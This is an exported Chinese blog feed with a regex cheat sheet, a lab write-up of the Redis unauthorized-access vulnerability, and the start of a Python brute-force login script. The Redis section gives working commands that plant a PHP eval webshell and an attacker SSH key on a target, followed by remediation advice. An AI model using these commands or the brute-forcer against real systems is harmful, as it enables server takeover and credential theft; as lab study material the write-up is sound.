<td align="right">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td>
</tr>
<tr>
<td align="left">\</td>
<td align="right">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td align="left">^</td>
<td align="right">匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。</td>
</tr>
<tr>
<td align="left">{</td>
<td align="right">标记限定符表达式的开始。要匹配 {，请使用 \{。</td>
</tr>
<tr>
<td align="left">|</td>
<td align="right">指明两项之间的一个选择。要匹配 |，请使用 \</td>
</tr>
</tbody></table>
<h2 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h2><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 <strong>*** 或 **+</strong> 或 <strong>?</strong> 或 <strong>{n}</strong> 或 <strong>{n,}</strong> 或 <strong>{n,m}</strong> 共6种。</p>
<p>正则表达式的限定符有：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td align="left">+</td>
<td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td align="left">?</td>
<td>匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td align="left">{n}</td>
<td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td align="left">{n,}</td>
<td>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td align="left">{n,m}</td>
<td>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
<h1 id="常用的正则表达式及含义"><a href="#常用的正则表达式及含义" class="headerlink" title="常用的正则表达式及含义"></a>常用的正则表达式及含义</h1><p><a href="http://c.runoob.com/front-end/854">参考</a></p>
<pre><code class="hljs taggerscript">一、校验数字的表达式

1. 数字：^[0-9]*$			// ^表示字符的开始，$表示结束  [0-9] 表示字符串中的字符在0-9中

2. n位的数字：^<span class="hljs-symbol">\d</span>&#123;n&#125;$    // <span class="hljs-symbol">\d</span>与[0-9]等价 ，&#123;n&#125; n表示匹配n次，所以表示匹配n位数

3. 至少n位的数字：^<span class="hljs-symbol">\d</span>&#123;n,&#125;$      //&#123;n,&#125;至少n次

4. m-n位的数字：^<span class="hljs-symbol">\d</span>&#123;m,n&#125;$     //&#123;n,m&#125;  n-m次

5. 零和非零开头的数字：^(0|[1-9][0-9]*)$  // | 是或者意思，表示匹配左右两个子表达式其中一个都可以

6. 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$    // +匹配前面的表达式一次或多次 (.[0-9]&#123;1,2&#125;)? 表示匹配  (.[0-9]&#123;1,2&#125;)一次或零次这子表达式代表的是0.[1-9]或者0.[0-9][1-9]

7. 带1-2位小数的正数或负数：^(<span class="hljs-symbol">\-</span>)?<span class="hljs-symbol">\d</span>+(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>&#123;1,2&#125;)?$     // (<span class="hljs-symbol">\-</span>)? 匹配一次或零次负号 

8. 正数、负数、和小数：^(<span class="hljs-symbol">\-</span>|<span class="hljs-symbol">\+</span>)?<span class="hljs-symbol">\d</span>+(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>+)?$     // <span class="hljs-symbol">\-</span> <span class="hljs-symbol">\+</span> <span class="hljs-symbol">\.</span>是将特殊字符转义

9. 有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$    

10. 有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$

11. 非零的正整数：^[1-9]<span class="hljs-symbol">\d</span>*$ 或 ^([1-9][0-9]*)&#123;1,3&#125;$ 或 ^<span class="hljs-symbol">\+</span>?[1-9][0-9]*$   // [1-9] 控制非零

12. 非零的负整数：^<span class="hljs-symbol">\-</span>[1-9][]0-9&quot;*$ 或 ^-[1-9]<span class="hljs-symbol">\d</span>*$  //一下的表达式的含义可以以此类推（感觉不是很常用）

13. 非负整数：^<span class="hljs-symbol">\d</span>+$ 或 ^[1-9]<span class="hljs-symbol">\d</span>*|0$

14. 非正整数：^-[1-9]<span class="hljs-symbol">\d</span>*|0$ 或 ^((-<span class="hljs-symbol">\d</span>+)|(0+))$

15. 非负浮点数：^<span class="hljs-symbol">\d</span>+(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>+)?$ 或 ^[1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*|0?<span class="hljs-symbol">\.</span>0+|0$

16. 非正浮点数：^((-<span class="hljs-symbol">\d</span>+(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>+)?)|(0+(<span class="hljs-symbol">\.</span>0+)?))$ 或 ^(-([1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*))|0?<span class="hljs-symbol">\.</span>0+|0$

17. 正浮点数：^[1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*$ 或 ^(([0-9]+<span class="hljs-symbol">\.</span>[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*<span class="hljs-symbol">\.</span>[0-9]+)|([0-9]*[1-9][0-9]*))$

18. 负浮点数：^-([1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*)$ 或 ^(-(([0-9]+<span class="hljs-symbol">\.</span>[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*<span class="hljs-symbol">\.</span>[0-9]+)|([0-9]*[1-9][0-9]*)))$

19. 浮点数：^(-?<span class="hljs-symbol">\d</span>+)(<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>+)?$ 或 ^-?([1-9]<span class="hljs-symbol">\d</span>*<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*|0<span class="hljs-symbol">\.</span><span class="hljs-symbol">\d</span>*[1-9]<span class="hljs-symbol">\d</span>*|0?<span class="hljs-symbol">\.</span>0+|0)$</code></pre>



<pre><code class="hljs gams">二、校验字符的表达式
<span class="hljs-number">1.</span> 汉字：^[\u4e00-\u9fa5]&#123;<span class="hljs-number">0</span>,&#125;<span class="hljs-symbol">$</span>   <span class="hljs-comment">//u4e00是unicode中第一个汉字编码 u9fa5是最后一个</span>

<span class="hljs-number">2.</span> 英文和数字：^[A-Za-z0<span class="hljs-number">-9</span>]+<span class="hljs-symbol">$</span> 或 ^[A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">4</span>,<span class="hljs-number">40</span>&#125;<span class="hljs-symbol">$</span>  <span class="hljs-comment">//[A-Za-z0-9]可以匹配大小写字母数字 </span>

<span class="hljs-number">3.</span> 长度为<span class="hljs-number">3</span><span class="hljs-number">-20</span>的所有字符：^.&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;<span class="hljs-symbol">$</span>  <span class="hljs-comment">// .代表任意字符包括换行符</span>

<span class="hljs-number">4.</span> 由<span class="hljs-number">26</span>个英文字母组成的字符串：^[A-Za-z]+<span class="hljs-symbol">$</span>

<span class="hljs-number">5.</span> 由<span class="hljs-number">26</span>个大写英文字母组成的字符串：^[A-Z]+<span class="hljs-symbol">$</span>

<span class="hljs-number">6.</span> 由<span class="hljs-number">26</span>个小写英文字母组成的字符串：^[a-z]+<span class="hljs-symbol">$</span>

<span class="hljs-number">7.</span> 由数字和<span class="hljs-number">26</span>个英文字母组成的字符串：^[A-Za-z0<span class="hljs-number">-9</span>]+<span class="hljs-symbol">$</span> <span class="hljs-comment">//与第二个表达式相同</span>

<span class="hljs-number">8.</span> 由数字、<span class="hljs-number">26</span>个英文字母或者下划线组成的字符串：^\w+<span class="hljs-symbol">$</span> 或 ^\w&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;<span class="hljs-symbol">$</span>   <span class="hljs-comment">//  \w=[0-9A-Za-z_]</span>

<span class="hljs-number">9.</span> 中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>_]+<span class="hljs-symbol">$</span>
 
<span class="hljs-number">10.</span> 中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]+<span class="hljs-symbol">$</span> 或 ^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">20</span>&#125;<span class="hljs-symbol">$</span>
 
<span class="hljs-number">11.</span> 可以输入含有^%&amp;<span class="hljs-string">&#x27;,;=?$\&quot;等字符：[^%&amp;&#x27;</span>,;=?<span class="hljs-symbol">$</span>\x22]+ 

<span class="hljs-number">12</span> 禁止输入含有~的字符：[^~\x22]+  <span class="hljs-comment">//这里的 ^是非的意思</span></code></pre>

<p>下面这些就不一一解释了，实在太多了有的还是重复。</p>
<pre><code class="hljs inform7">三、特殊需求表达式
1. Email地址：^\w+(<span class="hljs-comment">[-+.]</span>\w+)*@\w+(<span class="hljs-comment">[-.]</span>\w+)*\.\w+(<span class="hljs-comment">[-.]</span>\w+)*$

2. 域名：<span class="hljs-comment">[a-zA-Z0-9]</span><span class="hljs-comment">[-a-zA-Z0-9]</span>&#123;0,62&#125;(/.<span class="hljs-comment">[a-zA-Z0-9]</span><span class="hljs-comment">[-a-zA-Z0-9]</span>&#123;0,62&#125;)+/.?

3. InternetURL：<span class="hljs-comment">[a-zA-z]</span>+://<span class="hljs-comment">[^\s]</span>* 或 ^http://(<span class="hljs-comment">[\w-]</span>+\.)+<span class="hljs-comment">[\w-]</span>+(/<span class="hljs-comment">[\w-./?%&amp;=]</span>*)?$

4. 手机号码：^(13<span class="hljs-comment">[0-9]</span>|14<span class="hljs-comment">[5|7]</span>|15<span class="hljs-comment">[0|1|2|3|5|6|7|8|9]</span>|18<span class="hljs-comment">[0|1|2|3|5|6|7|8|9]</span>)\d&#123;8&#125;$

5. 电话号码(<span class="hljs-string">&quot;XXX-XXXXXXX&quot;</span>、<span class="hljs-string">&quot;XXXX-XXXXXXXX&quot;</span>、<span class="hljs-string">&quot;XXX-XXXXXXX&quot;</span>、<span class="hljs-string">&quot;XXX-XXXXXXXX&quot;</span>、<span class="hljs-string">&quot;XXXXXXX&quot;</span>和<span class="hljs-string">&quot;XXXXXXXX)：^(\(\d&#123;3,4&#125;-)|\d&#123;3.4&#125;-)?\d&#123;7,8&#125;$</span>
<span class="hljs-string"></span>
<span class="hljs-string">6. 国内电话号码(0511-4405222、021-87888822)：\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\d&#123;7&#125;</span>
<span class="hljs-string"></span>
<span class="hljs-string">7. 身份证号(15位、18位数字)：^\d&#123;15&#125;|\d&#123;18&#125;$</span>
<span class="hljs-string"></span>
<span class="hljs-string">8. 短身份证号码(数字、字母x结尾)：^(<span class="hljs-subst">[0-9]</span>)&#123;7,18&#125;(x|X)?$ 或 ^\d&#123;8,18&#125;|<span class="hljs-subst">[0-9x]</span>&#123;8,18&#125;|<span class="hljs-subst">[0-9X]</span>&#123;8,18&#125;?$</span>
<span class="hljs-string"></span>
<span class="hljs-string">9. 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^<span class="hljs-subst">[a-zA-Z]</span><span class="hljs-subst">[a-zA-Z0-9_]</span>&#123;4,15&#125;$</span>
<span class="hljs-string"></span>
<span class="hljs-string">10. 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^<span class="hljs-subst">[a-zA-Z]</span>\w&#123;5,17&#125;$</span>
<span class="hljs-string"></span>
<span class="hljs-string">11. 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\d)(?=.*<span class="hljs-subst">[a-z]</span>)(?=.*<span class="hljs-subst">[A-Z]</span>).&#123;8,10&#125;$</span>
<span class="hljs-string"></span>
<span class="hljs-string">12. 日期格式：^\d&#123;4&#125;-\d&#123;1,2&#125;-\d&#123;1,2&#125;</span>
<span class="hljs-string"></span>
<span class="hljs-string">13. 一年的12个月(01～09和1～12)：^(0?<span class="hljs-subst">[1-9]</span>|1<span class="hljs-subst">[0-2]</span>)$</span>
<span class="hljs-string"></span>
<span class="hljs-string">14. 一个月的31天(01～09和1～31)：^((0?<span class="hljs-subst">[1-9]</span>)|((1|2)<span class="hljs-subst">[0-9]</span>)|30|31)$</span>
<span class="hljs-string"></span>
<span class="hljs-string">14 钱的输入格式：</span>
<span class="hljs-string"></span>
<span class="hljs-string">15    1.有四种钱的表示形式我们可以接受:&quot;</span>10000.00<span class="hljs-string">&quot; 和 &quot;</span>10,000.00<span class="hljs-string">&quot;, 和没有 &quot;</span>分<span class="hljs-string">&quot; 的 &quot;</span>10000<span class="hljs-string">&quot; 和 &quot;</span>10,000<span class="hljs-string">&quot;：^<span class="hljs-subst">[1-9]</span><span class="hljs-subst">[0-9]</span>*$ </span>
<span class="hljs-string"></span>
<span class="hljs-string">16    2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符&quot;</span>0<span class="hljs-string">&quot;不通过,所以我们采用下面的形式：^(0|<span class="hljs-subst">[1-9]</span><span class="hljs-subst">[0-9]</span>*)$ </span>
<span class="hljs-string"></span>
<span class="hljs-string">17    3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?<span class="hljs-subst">[1-9]</span><span class="hljs-subst">[0-9]</span>*)$ </span>
<span class="hljs-string"></span>
<span class="hljs-string">18    4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^<span class="hljs-subst">[0-9]</span>+(.<span class="hljs-subst">[0-9]</span>+)?$ </span>
<span class="hljs-string"></span>
<span class="hljs-string">19    5.必须说明的是,小数点后面至少应该有1位数,所以&quot;</span>10.<span class="hljs-string">&quot;是不通过的,但是 &quot;</span>10<span class="hljs-string">&quot; 和 &quot;</span>10.2<span class="hljs-string">&quot; 是通过的：^<span class="hljs-subst">[0-9]</span>+(.<span class="hljs-subst">[0-9]</span>&#123;2&#125;)?$ </span>
<span class="hljs-string"></span>
<span class="hljs-string">20    6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^<span class="hljs-subst">[0-9]</span>+(.<span class="hljs-subst">[0-9]</span>&#123;1,2&#125;)?$ </span>
<span class="hljs-string"></span>
<span class="hljs-string">21    7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^<span class="hljs-subst">[0-9]</span>&#123;1,3&#125;(,<span class="hljs-subst">[0-9]</span>&#123;3&#125;)*(.<span class="hljs-subst">[0-9]</span>&#123;1,2&#125;)?$ </span>
<span class="hljs-string"></span>
<span class="hljs-string">22    8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^(<span class="hljs-subst">[0-9]</span>+|<span class="hljs-subst">[0-9]</span>&#123;1,3&#125;(,<span class="hljs-subst">[0-9]</span>&#123;3&#125;)*)(.<span class="hljs-subst">[0-9]</span>&#123;1,2&#125;)?$ </span>
<span class="hljs-string"></span>
<span class="hljs-string">23    备注：这就是最终结果了,别忘了&quot;</span>+<span class="hljs-string">&quot;可以用&quot;</span>*<span class="hljs-string">&quot;替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里</span>
<span class="hljs-string"></span>
<span class="hljs-string">24 xml文件：^(<span class="hljs-subst">[a-zA-Z]</span>+-?)+<span class="hljs-subst">[a-zA-Z0-9]</span>+\\.<span class="hljs-subst">[x|X]</span><span class="hljs-subst">[m|M]</span><span class="hljs-subst">[l|L]</span>$</span>
<span class="hljs-string"></span>
<span class="hljs-string">25 中文字符的正则表达式：<span class="hljs-subst">[\u4e00-\u9fa5]</span></span>
<span class="hljs-string"></span>
<span class="hljs-string">26 双字节字符：<span class="hljs-subst">[^\x00-\xff]</span>    (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))</span>
<span class="hljs-string"></span>
<span class="hljs-string">27 空白行的正则表达式：\n\s*\r    (可以用来删除空白行)</span>
<span class="hljs-string"></span>
<span class="hljs-string">28 HTML标记的正则表达式：&lt;(\S*?)<span class="hljs-subst">[^&gt;]</span>*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt;    (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)</span>
<span class="hljs-string"></span>
<span class="hljs-string">29 首尾空白字符的正则表达式：^\s*|\s*$或(^\s*)|(\s*$)    (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)</span>
<span class="hljs-string"></span>
<span class="hljs-string">30 腾讯QQ号：<span class="hljs-subst">[1-9]</span><span class="hljs-subst">[0-9]</span>&#123;4,&#125;    (腾讯QQ号从10000开始)</span>
<span class="hljs-string"></span>
<span class="hljs-string">31 中国邮政编码：<span class="hljs-subst">[1-9]</span>\d&#123;5&#125;(?!\d)    (中国邮政编码为6位数字)</span>
<span class="hljs-string"></span>
<span class="hljs-string">32 IP地址：\d+\.\d+\.\d+\.\d+    (提取IP地址时有用)</span>
<span class="hljs-string"></span>
<span class="hljs-string">33 IP地址：((?:(?:25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span>\\d|<span class="hljs-subst">[01]</span>?\\d?\\d)\\.)&#123;3&#125;(?:25<span class="hljs-subst">[0-5]</span>|2<span class="hljs-subst">[0-4]</span>\\d|<span class="hljs-subst">[01]</span>?\\d?\\d)) </span>
<span class="hljs-string"></span>
<span class="hljs-string">34 将url的协议，主机名，端口号，文件路径放到数组中:</span>
<span class="hljs-string">var str = &quot;</span>http://www.runoob.com:80/html/html-tutorial.html<span class="hljs-string">&quot;;</span>
<span class="hljs-string">var patt1 = /(\w+):\/\/(<span class="hljs-subst">[^/:]</span>+)(:\d*)?(<span class="hljs-subst">[^# ]</span>*)/;   //四个子表达式组合在一起，(\w+): 匹配字符串开始到: (<span class="hljs-subst">[^/:]</span>+) 匹配非/ 非:后的内容  (:\d*)? 匹配:后的若干数字且表达式重复一次或多次  (<span class="hljs-subst">[^# ]</span>*) 匹配不包括#或空格字符的任何字符序列</span></code></pre>



<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>正则表达式的功能还是很强大的，想要写出能准确匹配目标的表达式还是需要认真学习的，但是代码审计中的要求没那么严格，只需要能看懂表达式匹配了哪些内容即可。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>redis</title>
    <url>/2021/04/14/redis/</url>
    <content><![CDATA[<h1 id="redis未授权访问漏洞复现"><a href="#redis未授权访问漏洞复现" class="headerlink" title="redis未授权访问漏洞复现"></a>redis未授权访问漏洞复现</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<p>该漏洞的产生条件有以下两点：</p>
<p>1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</p>
<p>漏洞危害：<br>(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；<br>(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；<br>(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器;</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在kali中安装redis 3.2.0</p>
<pre><code class="hljs awk">创建redis安装目录
mkdir <span class="hljs-regexp">/usr/</span>local/redis
cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>
wget http:<span class="hljs-regexp">//</span>download.redis.io<span class="hljs-regexp">/releases/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
<span class="hljs-regexp">//</span>获取redis压缩包
tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>
make <span class="hljs-comment">#编译安装</span></code></pre>

<p>安装完成之后需要修改配置文件，配置允许可以远程访问。</p>
<p>vim redis.conf #修改默认配置文件</p>
<p>在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" alt="image-20210414153138387"></p>
<p>然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。</p>
<pre><code class="hljs awk">cd src
cp redis-cli <span class="hljs-regexp">/usr/</span>bin
cp redis-server <span class="hljs-regexp">/usr/</span>bin
cp redis.conf <span class="hljs-regexp">/etc/</span></code></pre>

<p>开启redis服务</p>
<pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153309311.png" alt="image-20210414153309311"></p>
<p>第一台作为攻击机即可，然后将这台主机克隆作为目标主机</p>
<p>攻击机</p>
<p>ip:192.168.164.145</p>
<p>目标主机</p>
<p>ip:192.168.164.23</p>
<p>首先确定目标主机是否开启redis服务，使用nmap扫描端口6379</p>
<p>如下，显示了目标使用的redis版本以及服务器的信息</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413225839841.png" alt="image-20210413225839841"></p>
<p>开始利用</p>
<h2 id="1-写入木马文件"><a href="#1-写入木马文件" class="headerlink" title="1.写入木马文件"></a>1.写入木马文件</h2><p>首先进入redis安装目录的src中执行</p>
<pre><code class="hljs avrasm">./redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.164</span><span class="hljs-number">.23</span></code></pre>

<p>成功控制目标的redis服务</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" alt="image-20210413230028713"></p>
<p>向其网站根目录中写入一句话木马</p>
<pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span>

<span class="xml">config set dbfilename shell.php</span>

<span class="xml">set x &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span>

<span class="xml">save </span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" alt="image-20210413230359912"></p>
<p>save成功后，目标主机的网站根目录就出现了木马文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230408356.png" alt="image-20210413230408356"></p>
<p>使用蚁剑连接</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230614612.png" alt="image-20210413230614612"></p>
<h2 id="2-写ssh-keygen公钥然后使用私钥进行登陆"><a href="#2-写ssh-keygen公钥然后使用私钥进行登陆" class="headerlink" title="2.写ssh-keygen公钥然后使用私钥进行登陆"></a>2.写ssh-keygen公钥然后使用私钥进行登陆</h2><p>写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。</p>
<p>首先生成公钥密钥文件</p>
<pre><code class="hljs awk">ssh-keygen -t rsa

cat <span class="hljs-regexp">/root/</span>.ssh/id_rsa.pub</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131910830.png" alt="image-20210414131910830"></p>
<p>继续使用命令</p>
<pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span>

config <span class="hljs-keyword">set</span> authorized_keys

<span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\id_rsa.pub的内容<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>

save</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131805309.png" alt="image-20210414131805309"></p>
<p>使用公钥连接</p>
<pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.164.23</code></pre>

<p>这里的id_rsa与创建ssh密钥输入的内容一致</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414133547275.png" alt="image-20210414133547275"></p>
<h2 id="3-利用计划任务反弹shell"><a href="#3-利用计划任务反弹shell" class="headerlink" title="3.利用计划任务反弹shell"></a>3.利用计划任务反弹shell</h2><p>只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、限制登录ip<br>在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。</p>
<p>2、添加密码<br>在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。</p>
<p>3、修改默认端口</p>
]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>python安全攻防</title>
    <url>/2021/08/16/python%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/</url>
    <content><![CDATA[<h1 id="多线程爆破账号密码"><a href="#多线程爆破账号密码" class="headerlink" title="多线程爆破账号密码"></a>多线程爆破账号密码</h1><p>文件目录</p>
<blockquote>
<p>passwords：密码字典 </p>
<p>username:   账号字典</p>
<p>result: 保存结果</p>
<p>WeakPass.py :破解程序</p>
</blockquote>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># 对字典的分块大小</span>
BLOCK_SIZE = <span class="hljs-number">1000</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>:</span>
    url = <span class="hljs-string">&quot;http://127.0.0.1/homework/brute/login.php&quot;</span>

    headers = &#123;
            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 &#x27;</span>
            <span class="hljs-string">&#x27;(KHTML, like Gecko) &#x27;</span>
            <span class="hljs-string">&#x27;Chrome/19.0.1036.7 Safari/535.20&#x27;</span>
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, username, password</span>):</span>
        self.username = username
        self.password = password


    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
        data = &#123;
            <span class="hljs-string">&#x27;username&#x27;</span>:username,
